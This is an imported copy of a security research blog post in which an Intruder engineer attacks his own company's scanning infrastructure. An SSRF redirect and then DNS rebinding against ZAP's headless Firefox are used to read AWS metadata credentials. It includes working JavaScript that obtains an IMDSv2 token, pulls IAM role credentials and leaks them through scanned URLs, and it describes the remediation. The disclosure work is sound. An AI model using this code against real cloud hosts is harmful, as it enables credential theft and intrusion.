---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-12-01_we-hacked-ourselves-with-dns-rebinding.md
original_filename: 2023-12-01_we-hacked-ourselves-with-dns-rebinding.md
title: We Hacked Ourselves With DNS Rebinding
category: documents
detected_topics:
- cloud-security
- api-security
- sso
- ssrf
- xss
- command-injection
tags:
- imported
- documents
- cloud-security
- api-security
- sso
- ssrf
- xss
- command-injection
language: en
raw_sha256: 45759bfad85c52586f4820cd48ea48e252b5ca9905421e98dea8201b434716b8
text_sha256: f5ab10f7e99901e8fb6009874cf934c38f8385919bb8914c646c1d2a8238c9fe
ingested_at: '2026-06-28T07:32:27Z'
sensitivity: unknown
redactions_applied: false
---

# We Hacked Ourselves With DNS Rebinding

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-12-01_we-hacked-ourselves-with-dns-rebinding.md
- Source Type: markdown
- Detected Topics: cloud-security, api-security, sso, ssrf, xss, command-injection
- Ingested At: 2026-06-28T07:32:27Z
- Redactions Applied: False
- Raw SHA256: `45759bfad85c52586f4820cd48ea48e252b5ca9905421e98dea8201b434716b8`
- Text SHA256: `f5ab10f7e99901e8fb6009874cf934c38f8385919bb8914c646c1d2a8238c9fe`


## Content

---
title: "We Hacked Ourselves With DNS Rebinding"
url: "https://www.intruder.io/research/we-hacked-ourselves-with-dns-rebinding"
final_url: "https://www.intruder.io/research/we-hacked-ourselves-with-dns-rebinding"
authors: ["Daniel Thatcher (@_danielthatcher)"]
programs: ["Intruder"]
bugs: ["DNS rebinding"]
publication_date: "2023-12-01"
added_date: "2023-12-26"
source: "pentester.land/writeups.json"
original_index: 656
---

[![Intruder logo](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/64931cbdee18510b47f41730_Logo.svg)](/)

  * Platform

  * [AI PentestingThe depth of a pentest, on-demand](/platform/ai-pentesting)
  * [Cloud SecurityDaily config checks](/platform/cloud-security)
  * [Attack Surface ManagementDetect changes and hidden assets](/platform/attack-surface-management)
  * [GregAI Security AnalystAct faster](/platform/ai-security-analyst)
  * [Vulnerability ManagementScan, prioritize, remediate](/platform/vulnerability-management)
  * [IntegrationsCompliance and workflow management![](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/68bf47477497d547db8ce5ad_integrations.svg)](/platform/integrations)

  * Solutions  

  * [External ScanningInfrastructure security](/use-cases/external-vulnerability-scanning)
  * [Attack Surface MonitoringRespond to changes](/use-cases/attack-surface-monitoring)
  * [DASTSecure web apps](/use-cases/dast)
  * [Website Security140k+ checks](/use-cases/website-security)
  * [Risk Based PrioritizationNo more alert fatigue](/use-cases/risk-based-vulnerability-management)
  * [API SecurityTest your APIs](/use-cases/api-security)
  * [Asset DiscoveryReveal unknown targets](/use-cases/asset-discovery)
  * [Emerging Threat DetectionCheck and act fast](/use-cases/emerging-threat-scanning)
  * [CSPMDaily cloud config checks](/use-cases/cspm)
  * [ComplianceSOC 2, ISO, HIPAA, DORA](/use-cases/compliance)
  * [Cyber Hygiene ReportingDemonstrate progress](/use-cases/vulnerability-management-reporting)
  * [Container Image ScanningAutomated discovery and scanning](/use-cases/container-image-scanning)
  * [Secrets DetectionPrevent leaked credentials](/use-cases/secrets-detection)
  * [Internal ScanningSecure employee devices](/use-cases/internal-vulnerability-scanning)
  * [Case Studies](/success-stories)

  * [Pricing](/pricing)
  * Resources

Free Tools

  * [cvemonVulnerability intel](https://cvemon.intruder.io/)
  * [ AutoswaggerCheck for API auth flaws](https://github.com/intruder-io/autoswagger)
  * [ AWASP Top TenOWASP, but with evidence](https://awasp.org/)

Security

  * [ Security ResearchInsights from our experts](/research)
  * [ BlogGuides & insights](/blog)
  * [ Cyber GlossaryLearn the lingo](/glossary)

Customers

  * [Help CenterFAQs & tutorials](https://help.intruder.io/en/?_gl=1*9iuogt*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NjU0NDQ1MS4xOS4wLjE2ODY1NDQ0NTEuNjAuMC4w)
  * [ Developer HubAPIs & integrations](https://developers.intruder.io/docs/welcome)
  * [ Trust CenterSecurity & compliance](https://trust.intruder.io/)

  * Company

  * [About IntruderHistory and mission](/about-us)
  * [PressNews and interviews](/press)
  * [Partner ProgramBecome a reseller](/partners)
  * [CareersWork with us](https://careers.intruder.io/?_gl=1*1nmt3bk*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NzI0OTQ3NS4yOC4xLjE2ODcyNDk0NzYuNTkuMC4w)
  * [ContactGet in touch](/contact)

[BOOK A DEMO](/get-demo)[Try free](https://portal.intruder.io/free_trial?__hstc=17958374.b73aa9ab7ef5c36b66105c3ccda231eb.1733843293400.1733843293400.1733843293400.1&__hssc=17958374.1.1733843293400&__hsfp=51185828)[Log in](https://accounts.intruder.io/login?__hstc=17958374.745348f99aa3f380087c4ff0668fb314.1734654557436.1734654557436.1734654557436.1&__hssc=17958374.1.1734654557436&__hsfp=51185828)

[Log in](https://accounts.intruder.io/login?__hstc=17958374.745348f99aa3f380087c4ff0668fb314.1734654557436.1734654557436.1734654557436.1&__hssc=17958374.1.1734654557436&__hsfp=51185828)[Try for free](https://portal.intruder.io/free_trial?__hstc=17958374.b73aa9ab7ef5c36b66105c3ccda231eb.1733843293400.1733843293400.1733843293400.1&__hssc=17958374.1.1733843293400&__hsfp=51185828)[BOOK A DEMO](/get-demo)

![](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/697f89fada52ff5ffd531bf5_clouds_centre.svg)

[![](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/697f8b9557aa5dcce0cdf59a_Icon%20\(2\).svg)Back to more research](/research)

# We Hacked Ourselves With DNS Rebinding

![We Hacked Ourselves With DNS Rebinding](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/656ef90db535ad68279414f7_hack_ourselves_pt1.avif)

[![Daniel Thatcher ](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/6569d36ffc2f9ec21b3f563c_Dan.T.avif)Daniel Thatcher Security Research Engineer](/author/daniel-thatcher)

Updated

December 12, 2023

Published

December 1, 2023

![](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/697f855045438548a4944e33_Brand.svg)![](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/697f8556a95b95be4c061fe0_Brand.svg)![](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/697f8564317c519dedb1d71e_Frame%203605.svg)

[![Daniel Thatcher ](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/6569d36ffc2f9ec21b3f563c_Dan.T.avif)Daniel Thatcher Security Research Engineer](/author/daniel-thatcher)![](https://cdn.prod.website-files.com/plugins/Basic/assets/placeholder.60f9b1840c.svg)

 _This post is the first in a two-part series on DNS rebinding in web browsers. Here, I’ll talk about a DNS rebinding exploit against our own platform which allowed me to extract low-privileged AWS credentials._[_In the next post_](http://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari) _, I share new techniques to reliably achieve split-second DNS rebinding in Chrome, Edge, and Safari, as well as to bypass Chrome's restrictions on requests to private networks._

While the impact of this vulnerability ended up being low due to defence-in-depth measures we employ, the technique to get there is interesting in itself as it is simple enough to demonstrate that DNS rebinding exploits can be realistic, even in time-boxed scenarios such as pentests.

# The Initial Bug

The journey to using DNS rebinding started with a simpler bug. We run servers which we refer to as “screenshot workers”. These workers are responsible for taking screenshots of customers’ websites to be shown in our platform.

While performing some security testing against our platform, I discovered that these workers would follow HTTP redirects before taking a screenshot. Further, the screenshotting tool running on these workers wasn’t prevented from accessing the internal EC2 metadata service, which can be used to retrieve AWS credentials for the roles available to the workers.

To exploit this, I set up a web server on the public internet which redirected to _http://169.254.169.254/latest/meta-data/iam/security-credentials/_. This is the standard URL for the endpoint on the EC2 metadata service which lists the roles available to the EC2 instance. When this web server was added as a target in our platform, and the screenshot worker took a screenshot of my website, the worker got redirected to this URL before taking a screenshot. This resulted in a screenshot of the list of available roles being shown in the platform.

I modified my web server to redirect to the endpoint which gives credentials for one of the available roles at _http://169.254.169.254/latest/meta-data/iam/security-credentials/ <RoleName>_. When the worker took another screenshot, I was presented with a screenshot containing credentials for this role:

![](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/64abcb4ce853dab985a75024_XOsgWN54lC0esSvNmutQr1g_g56n6G-n9NrVf55QqeJFuTMmYUrFJeSvqruImuHWVCSw90BhOErI0oHxXBDKHGLWr9v8JYvd9u6QlXa2Uwj7UPnpTsmuC1fFFlf1gdmr15VOHOJI1gGZyiGlc1G1f88.png)

I notified our DevOps team, and suggested that as a long-term solution we implement network-level restrictions to prevent the screenshotting tool from accessing the metadata service.

As a quicker fix, I suggested that we switch the workers to using [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html). IMDSv2 prevents this attack by requiring a token to be included in a header in all requests to the metadata service. This token can be obtained by making a PUT request to a specific endpoint on the metadata service. With HTTP redirects, like the ones our screenshot workers were following, you can’t set headers, or make PUT requests and view their responses. I thought we were safe, until I remembered a rarely-used technique - DNS rebinding.

# What is DNS Rebinding?

I wanted to use DNS rebinding to allow a malicious web page loaded from the public internet to make requests to a target web server on the worker's local network, and read the responses. For this technique to work, the target web server must meet a couple of requirements:  

  1. The web server can’t validate the hostname in the _Host_ header
  2. The web server must use HTTP rather than HTTPS

Helpfully, the AWS metadata service available by default to EC2 instances at _http://169.254.169.254_ fits both of these conditions.

Here, we're going to consider the simplest approach to retrieve the contents of an endpoint from a target web server at _http://169.245.169.254/latest/meta-data/_. This was sufficient for the exploit against our platform as the browser targeted would stay open for a long time. This often won’t be the case when attacking web applications, which is where you have to rely on faster techniques such as those [presented by Gérald Doussot & Roger Meyer](https://github.com/nccgroup/singularity), or the techniques discussed in the next blog post.

![](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/65674f8a6919b47d5e300eff_a0D_1HliLzfz-992LEZOM2t35-j_btMl9hHkkOfoy_MBKrl6YlSaF_bhIsi2ZrOWOscLrG8cwaxxS1yofx7E-ivs08rwTS0IetrmkogIlBo7FiipbrexrLYVoZ_Sq6BdHHzCfBGSMVrU9d4uvNo44As.avif)

This starts by a user (or an automated browser) following a link to _http://evil.com_. In this scenario, _evil.com_ is a domain owned by the attacker, who also controls the DNS servers for the domain.

This browser navigation will trigger a DNS lookup of _evil.com_ from the user’s machine, where the attacker’s DNS server responds with the IP address of a public web server they control. The user’s browser will then load _http://evil.com_ from this web server, where the attacker serves a page that repeatedly tries to request _http://evil.com/latest/meta-data/_. This URL is under the same [origin](https://developer.mozilla.org/en-US/docs/Glossary/Origin) as the requesting page, so the response can be read by JavaScript.

If the user keeps the page open for long enough, their cached DNS response for _evil.com_ will expire, and another DNS lookup of _evil.com_ will be performed so that the browser can keep making requests. This time, the attacker’s DNS server responds by saying the IP address of _evil.com_ is _169.254.169.254_ \- the IP address of the target web server.

The browser will now send requests to this IP address when requesting _http://evil.com/latest/meta-data/_. As the web server at _http://169.254.169.254_ meets the above requirements, the content of _http://169.254.169.254/latest/meta-data/_ will be returned. The requested endpoint is under the same origin as the requesting page, so the browser allows this response to be read from JavaScript.

Hence, by getting a browser to load a malicious page on the public internet, an attacker can read responses from a web server on the local network.

# ZAP's AJAX Spider

We enable [ZAP's AJAX spider](https://www.zaproxy.org/docs/desktop/addons/ajax-spider/) for some customers, which drives headless Firefox to discover content on the target website. While I'd never played with them, DNS rebinding attacks against browsers are well-documented, and I knew enough to know that they should allow a malicious user to fully interact with the metadata service using JavaScript.

This meant that the restrictions put in place by IMDSv2 could be bypassed. I would be able to make a PUT request to the metadata service and read the response to get the token. I would also be able to include this token in all requests to the metadata service.

Targeting the AJAX spider also provided another key advantage - time. Some quick testing suggested that the faster DNS rebinding techniques have become fiddly and unreliable with changes to browser behaviour in the past few years. ZAP's AJAX spider will browse a website for up to an hour if there is enough content, so there was plenty of time to wait for the cached DNS record to expire and exploit DNS rebinding using the simpler technique described above.

I didn't have a complex website ready for the AJAX spider to target, but keeping it busy was quite straightforward - I just filled a page with randomly generated hash links. This caused ZAP's spider to load the index page, click on the first five links (which wouldn't cause page loads), and then reload the index page and start again. It would do this until the one hour timeout was reached.

# Exploit

To get a domain which alternated between resolving to my server and _169.245.169.254_ I used [Tavis Ormandy](https://twitter.com/taviso)'s [rbdnr service](https://lock.cmpxchg8b.com/rebinder.html). For example, _c6336401.a9fea9fe.rbndr.us_ will alternate between resolving to _198.51.100.1_ and _169.254.169.254_ :
  
  
  $ dig c6336401.a9fea9fe.rbndr.us +short
  169.254.169.254
  $ dig c6336401.a9fea9fe.rbndr.us +short
  198.51.100.1
  $ dig c6336401.a9fea9fe.rbndr.us +short
  169.254.169.254
  $ dig c6336401.a9fea9fe.rbndr.us +short
  198.51.100.1

I created a website which would keep ZAP busy for an hour as above, and scanned it with this domain. I included a script in this website which would continuously try to request to _/latest_ and check if the response included a token which indicated that it came from my web server:
  
  
  let path = "/latest"
  let token = "script.js"
  ...
  async function run() {
  while (true) {
  // Check if rebinding has worked
  fetch(path)
  .then(resp => resp.text())
  .then(text => {
  console.log(`Retrieved /latest: ${text}`)
  if (!text.includes(token)) { // rebinding successful
  console.log("Retrieving metadata...")
  // This function performs fetch requests to extract credentials from the AWS metadata service
  fetchMetdata()
  }
  })
  .catch(err => {})
  
  // Pause for 1 second before trying again
  await new Promise(r => setTimeout(r, 1000))
  }
  }
  
  run()
  

After a sufficient amount of time, Firefox will perform a second DNS lookup of _c6336401.a9fea9fe.rbndr.us_ , and receive the result _169.254.169.254_. All future requests to _/latest_ will now be directed to the endpoint at _http://169.254.169.254/latest_. The script will detect this since that response doesn't contain the text "script.js", and run a function to extract data from the AWS metadata service:
  
  
  function fetchMetdata() {
  let token = ""
  // Get an API token from the metadata service to include in future requests
  fetch("/latest/api/token", {
  method: "PUT",
  headers: {
  "X-aws-ec2-metadata-token-ttl-seconds": "21600"
  }
  })
  .then(resp => resp.text())
  .then(text => {
  token = text
  console.log(`Found token: ${token}`)
  
  // Get a list of the roles from the API
  return fetch("/latest/meta-data/iam/security-credentials", {
  headers: {
  "X-aws-ec2-metadata-token": token
  }
  })
  })
  .then(resp => resp.text())
  .then(text => {
  console.log(`Found roles: ${text}`)
  
  // Get credentaisl for the first role
  let firstRole = text.split("\n")[0]
  return fetch(`/latest/meta-data/iam/security-credentials/${firstRole}`, {
  headers: {
  "X-aws-ec2-metadata-token": token
  }
  })
  })
  .then(resp => resp.text())
  .then(text => {
  // 'text' now contains credentials for the first role. Only leak the first 250 charactes of the credentials since that's sufficient proof
  let creds = text.substring(0, 250)
  // TODO: exfiltrate these credentials
  })
  .catch(err => { console.log(err) })
  }
  

## Exfiltration

At this point the script would have AWS credentials sitting in a JavaScript variable - all that was left to do was send them to myself. ZAP added a small challenge here as it aggressively blocks any requests that aren't within its defined scan scope, preventing me from simply sending the credentials back to my server. I wouldn't be able to wait for the DNS resolution to switch back to my server again since ZAP would quickly stop spidering after loading the metadata service as there were no links on it. I also wouldn’t be able to exfiltrate the credentials through a DNS lookup, as ZAP will block requests to out of scope hostnames before performing a DNS lookup.

Fortunately, we show the scanned URLs to our customers. I could make a fetch request containing the credentials, and it would show up in the scanned URLs:
  
  
  fetch(`/?exfilStage=2&creds=${btoa(creds)}`)
  

![](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/64abcedef552ba8a1b193014_Creds%20-%20redacted.webp)

Decoding the base64 in the returned requests gives the AWS credentials from the metadata service:
  
  
  $ printf ewogICJDb2RlIiA... | base64 -d
  {
  "Code" : "Success",
  "LastUpdated" : "2023-03-22T17:03:27Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "...",
  "Token" : "..."
  }
  

# Impact and Wash-up

While it's always nice to get AWS credentials, and this was the first time I've found a use for DNS rebinding on a real target, the impact of this vulnerability was quite low.

The permissions on the credentials were locked down to the bare minimum. There was some potential for service disruption, but pivoting further into AWS would not have been possible. The metadata service did not contain any other sensitive information that could be useful to an attacker. I discussed what other HTTP services I would be able to reach from our workers with the DevOps team, and it turns out that was very little I would have been able to do through that path.

This situation was a great demonstration of the importance of defence-in-depth. If someone had managed to find this vulnerability before we patched it, the other measures we had in place would have severely limited the attack surface that would open up to them.

The initial vulnerability in our screenshot workers was resolved in the same evening it was discovered by enforcing the use of IMDSv2. This was followed by a review of the AWS logs which showed that the scanning workers had only accessed credentials from the metadata service during my testing.

The workaround using DNS rebinding was discovered while work was ongoing to prevent our scanning tools access to the metadata endpoint on the network level. These restrictions were deployed to our ZAP workers the day after I provided a proof-of-concept for extracting credentials using DNS rebinding, and later deployed to all our workers.

# Where to next?

The attentive readers may now be wondering if performing utilising DNS rebinding against our screenshot workers would have also led to the same result, since they drive headless Chrome. This wasn't possible at the time due to short timeouts on the screenshot workers, and restrictions in Chrome around making requests to private networks.

However, this question kicked off a new research project which led to bypassing these restrictions, and finding new techniques for split-second DNS rebinding in Chrome, Edge, and Safari. The details of this research will be published in the next blog post.

Part of my aim while performing this exploit was to try and keep things simple. DNS rebinding has long felt to me like a technique too complex to use on a web application penetration test where I'm under time constraints. Through the process of attacking our own portal, I've proven to myself, and hopefully to you, that this isn't the case.

[Click here to read part 2](http://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari).

‍

## Other research articles

[![Practical HTTP Header Smuggling: Sneaking Past Reverse Proxies to Attack AWS and Beyond](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/61dd9339d05701c9830b35ef_smugglers.avif)Practical HTTP Header Smuggling: Sneaking Past Reverse Proxies to Attack AWS and BeyondModern web applications typically rely on chains of multiple servers, which forward HTTP requests to one another. The attack surface created by this forwarding is increasingly receiving more attention, including the recent popularisation of cache poisoning...Daniel Thatcher November 10, 2021](/research/practical-http-header-smuggling)

[![How We’re Using AI to Write Vulnerability Checks \(and Where It Falls Short\)](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/68c2eb250f406e07d6693871_Agentic%20AI%20Header%20Image%20Design.jpg)How We’re Using AI to Write Vulnerability Checks (and Where It Falls Short)Intruder’s security team is experimenting with agentic AI to accelerate vulnerability checks. Discover what’s working, what isn’t, and why AI isn’t the silver bullet it’s made out to be.Benjamin MarrSeptember 11, 2025](/research/the-state-of-agentic-ai-in-vulnerability-management)

[![Shadow IT Isn’t Invisible - It’s Expanding Your Attack Surface. Here’s Proof](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/68a5f1dcbfefcd9580f0c30c_Shadow%20IT%20blog%20header.jpg)Shadow IT Isn’t Invisible - It’s Expanding Your Attack Surface. Here’s ProofIntruder’s security team used CT log queries to find millions of exposed hosts - then found a wide range of Shadow IT exposures attackers can exploit. See real-world Shadow IT risks and what they mean for your attack surface.Benjamin MarrAugust 20, 2025](/research/shadow-it-risks)

## Sign up for your free 14-day trial

[Try for free](https://portal.intruder.io/free_trial)

![](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/678e7f3d291be28e461ce216_74b8b3edcebfb1003b2f3fe2483d1a6a_Feature%3DOverview-2.svg)
